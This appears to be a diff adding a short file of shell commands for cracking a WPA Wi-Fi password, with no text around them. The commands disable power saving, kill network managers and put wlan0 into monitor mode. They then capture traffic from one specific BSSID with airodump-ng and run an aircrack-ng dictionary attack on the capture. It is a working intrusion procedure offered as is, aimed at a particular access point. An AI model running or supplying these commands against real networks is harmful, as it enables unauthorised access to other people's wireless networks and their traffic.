@@ -1,0 +1,17 @@
+iwconfig; cat /etc/NetworkManager/conf.d/default-wifi-powersave-on.conf
+
+
+iwconfig
+iwconfig wlan0 power off
+airmon-ng check kill
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+iwconfig
+
+
+airodump-ng wlan0
+airodump-ng --bssid 18:E8:29:F7:EC:BD --channel 11 --write wpafile wlan0
+
+
+aircrack-ng -a2 -w dictionary wpafile-01.cap
